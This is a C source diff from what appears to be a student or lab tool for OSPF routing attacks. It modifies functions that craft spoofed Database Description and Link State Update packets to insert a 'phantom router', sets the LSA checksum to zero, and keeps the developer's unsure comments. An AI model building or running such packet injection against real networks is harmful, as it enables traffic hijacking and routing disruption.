@@ -49,9 +49,9 @@ int attack_write_hello(unsigned char buffer[BUFFER_LEN], unsigned char *local_ma
 
 // Writes an OSPF DB Description Packet on the buffer and returns the total amount
 // of bytes that should be sent over the network
-int attack_write_db_description(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, char *router_ip) {
+int attack_write_db_description(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, char *router_ip, __u32 sequence_number, __u8 control) {
   // Ethernet header
-  unsigned char *dest_mac = parse_mac_addr(IPV4_MULTICAST_MAC);
+  unsigned char *dest_mac = parse_mac_addr(ROUTER_MAC);
   int ether_header_len = write_ipv4_ethernet_header(buffer, local_mac, dest_mac);
 
   // Position on the buffer where we should begin writing OSPF data
@@ -59,9 +59,8 @@ int attack_write_db_description(unsigned char buffer[BUFFER_LEN], unsigned char 
   unsigned char *ospf_buffer_ptr = buffer + ospf_packet_offset;
 
   // OSPF sections of the packet
-  __u8 control = DDC_INIT + DDC_MORE + DDC_MSTR;
   int ospf_len = 0;
-  ospf_len += ospf_write_db_description(ospf_buffer_ptr + sizeof(struct ospf_header), 1000, control);
+  ospf_len += ospf_write_db_description(ospf_buffer_ptr + sizeof(struct ospf_header), sequence_number, control);
   ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, sizeof(struct ospf_dd), OSPF_DATADESC_T);
   ospf_len += ospf_write_lss_data_block(ospf_buffer_ptr + ospf_len);
 
@@ -152,8 +151,8 @@ int ospf_write_ls_update(unsigned char *buffer, char *local_ip) {
   lss_header_ospf->lss_lsid = inet_addr(local_ip);                          /* Link State Identifier */
   lss_header_ospf->lss_rid = inet_addr(local_ip);                           /* Advertising Router Identifier ?pedro I think would was THE PHANTOM ROUTER*/
   lss_header_ospf->lss_seq = LSS_SEQ_NUM;                                   /* Link State Adv. Sequence #   */
-  // TODO: CHECKSUM: lss_header_ospf->lss_cksum;  /* ?pedro Fletcher Checksum of LSA */
-  lss_header_ospf->lss_len = LSS_LENGTH;    /* Length of Advertisement ?pedro I don't know, because in wireshark a header has 3 LSS and values not equal*/
+  lss_header_ospf->lss_cksum = 0x0000;                                      /* Fletcher Checksum of LSA */
+  lss_header_ospf->lss_len = LSS_LENGTH;                                    /* Length of Advertisement ?pedro I don't know, because in wireshark a header has 3 LSS and values not equal*/
   length += sizeof(struct ospf_lss);
 
   // OSPF Network Links Advertisement
